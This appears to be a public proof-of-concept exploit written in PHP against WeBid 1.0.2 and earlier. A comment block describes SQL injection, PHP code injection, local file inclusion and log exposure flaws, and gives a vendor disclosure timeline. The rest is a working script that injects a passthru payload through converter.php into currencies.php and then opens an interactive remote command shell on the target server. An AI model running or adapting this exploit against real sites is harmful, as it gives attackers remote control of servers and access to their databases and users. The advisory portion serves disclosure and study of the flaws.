@@ -1,0 +1,180 @@
+<?php
+
+/*
+
+	------------------------------------------------------------
+	WeBid <= 1.0.2 (converter.php) Remote Code Execution Exploit
+	------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	link.....: http://www.webidsupport.com/
+    
+	
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+	
+	
+	[-] Vulnerable code to SQL injection in feedback.php:
+	
+	154.	$query = "SELECT title FROM " . $DBPrefix . "auctions WHERE id = " . $_REQUEST['auction_id'] . " LIMIT 1";
+	155.	$res = mysql_query($query);
+	156.	$system->check_mysql($res, $query, __LINE__, __FILE__);
+	157.	$item_title = mysql_result($res, 0, 'title');
+	
+	Input passed through $_REQUEST['auction_id'] isn't properly sanitised before being used in the SQL query at line 154.
+
+	[-] Vulnerable code to SQL injection (works with magic_quotes_gpc = off) in logout.php:
+
+	21.	if (isset($_COOKIE['WEBID_RM_ID']))
+	22.	{
+	23.	        $query = "DELETE FROM " . $DBPrefix . "rememberme WHERE hashkey = '" . $_COOKIE['WEBID_RM_ID'] . "'";
+	24.	        $system->check_mysql(mysql_query($query), $query, __LINE__, __FILE__);
+	25.	        setcookie('WEBID_RM_ID', '', time() - 3600);
+	26.	}
+
+	Input passed through $_COOKIE['WEBID_RM_ID'] isn't properly sanitised before being used in the SQL query at line 23.
+
+	
+	[-] Vulnerable code to SQL injection (works with magic_quotes_gpc = off) in user_login.php:
+
+	84.			if (isset($_COOKIE['WEBID_ONLINE']))
+	85.			{
+	86.				$query = "DELETE from " . $DBPrefix . "online WHERE SESSION = '" . $_COOKIE['WEBID_ONLINE'] . "'";
+	87.				$system->check_mysql(mysql_query($query), $query, __LINE__, __FILE__);
+	88.			}
+
+	Input passed through $_COOKIE['WEBID_ONLINE'] isn't properly sanitised before being used in the SQL query at line 86.
+
+	[-] Vulnerable code to arbitrary PHP code jnjection (works with magic_quotes_gpc = off) in /includes/converter.inc.php:
+
+	61.	function buildcache($newaarray)
+	62.	{
+	63.	        global $include_path;
+	64.	
+	65.	        $output_filename = $include_path . 'currencies.php';
+	66.	        $output = "<?php\n";
+	67.	        $output.= "\$conversionarray[] = '" . time() . "';\n";
+	68.	        $output.= "\$conversionarray[] = array(\n";
+	69.	
+	70.	        for ($i = 0; $i < count($newaarray); $i++)
+	71.	        {
+	72.	                $output .= "\t" . "array('from' => '" . $newaarray[$i]['from'] . "', 'to' => '" . $newaarray[$i]['to'] . "', 'rate' => '" . $newaarray[$i]['rate'] . "')";
+	73.	                if ($i < (count($newaarray) - 1))
+	74.	                {
+	75.	                        $output .= ",\n";
+	76.	                }
+	77.	                else
+	78.	                {
+	79.	                        $output .= "\n";
+	80.	                }
+	81.	        }
+	82.	
+	83.	        $output .= ");\n?>\n";
+	84.	
+	85.	        $handle = fopen($output_filename, 'w');
+	86.	        fputs($handle, $output);
+	87.	        fclose($handle);
+	88.	}
+
+	Input passed to buildcache() function through $_POST['from'] or $_POST['to'] isn't properly sanitised before being
+	written to currencies.php file, this can lead to arbitrary PHP code injection.
+
+	[-] Vulnerable code to LFI (works with magic_quotes_gpc = off) in /includes/converter.inc.php:
+
+	18.	if (isset($_GET['lan']) && !empty($_GET['lan']))
+	19.	{
+	20.	        if ($user->logged_in)
+	21.	        {
+	22.	                $query = "UPDATE " . $DBPrefix . "users SET language = '" . mysql_real_escape_string($_GET['lan']) . "' WHERE id = " . $user->user_data['id'];
+	23.	        }
+	24.	        else
+	25.	        {
+	26.	                // Set language cookie
+	27.	                setcookie('USERLANGUAGE', $_GET['lan'], time() + 31536000, '/');
+	28.	        }
+	29.	        $language = $_GET['lan'];
+	30.	}
+	31.	elseif ($user->logged_in)
+	32.	{
+	33.	        $language = $user->user_data['language'];
+	34.	}
+	35.	elseif (isset($_COOKIE['USERLANGUAGE']))
+	36.	{
+	37.	        $language = $_COOKIE['USERLANGUAGE'];
+	38.	}
+	39.	else
+	40.	{
+	41.	        $language = $system->SETTINGS['defaultlanguage'];
+	42.	}
+	43.	
+	44.	if (!isset($language) || empty($language)) $language = $system->SETTINGS['defaultlanguage'];
+	45.	
+	46.	include $main_path . 'language/' . $language . '/messages.inc.php';
+
+	Input passed through $_GET['lan'] or $_COOKIE['USERLANGUAGE'] parameter isn't properly sanitised before
+
+	being used to include files on line 46. This can be exploited to include arbitrary local files.
+
+	[-] Information leak vulnerability into /logs directory, cause anyone can read cron.log and error.log
+
+
+	[-] Disclosure timeline:
+
+	[19/06/2011] - Vulnerabilities discovered
+	[19/06/2011] - Vendor contacted
+	[20/06/2011] - Vendor contacted again
+	[21/06/2011] - No response from vendor
+	[21/06/2011] - Issue reported to http://sourceforge.net/apps/mantisbt/simpleauction/view.php?id=34
+	[22/06/2011] - Issue reported to http://www.webidsupport.com/forums/project.php?do=issuelist&projectid=1
+	[22/06/2011] - Vendor responsed and released patches: http://www.webidsupport.com/forums/showthread.php?3892
+	[04/07/2011] - Public disclosure
+
+*/
+
+error_reporting(E_ERROR);
+set_time_limit(0);
+
+if (!extension_loaded("curl")) die("cURL extension required\n");
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_VERBOSE, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+
+function http_post($page, $data)
+{	
+	global $ch, $url;
+	
+	curl_setopt($ch, CURLOPT_URL, $url.$page);
+	curl_setopt($ch, CURLOPT_POST, true);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+
+	return curl_exec($ch);
+}
+
+print "\n+----------------------------------------------------------------------+";
+print "\n| WeBid <= 1.0.2 (converter.php) Remote Code Execution Exploit by EgiX |";
+print "\n+----------------------------------------------------------------------+\n";
+
+if ($argc < 2)
+{
+	print "\nUsage......: php $argv[0] <url>\n";
+	print "\nExample....: php $argv[0] https://localhost/";
+	print "\nExample....: php $argv[0] http://localhost/webid/\n";
+	die();
+}
+
+$url = $argv[1];
+
+$code = rawurlencode("\0'));print('_code_');passthru(base64_decode(\$_POST['c'])//");
+http_post("converter.php", "action=convert&from=USD&to={$code}");
+
+while(1)
+{
+	print "\nwebid-shell# ";
+	if (($cmd = trim(fgets(STDIN))) == "exit") break;
+	preg_match("/_code_(.*)/s", http_post("includes/currencies.php", "c=".base64_encode($cmd)), $m) ? print $m[1] : die("\n[-] Exploit failed\n");
+}
+?>
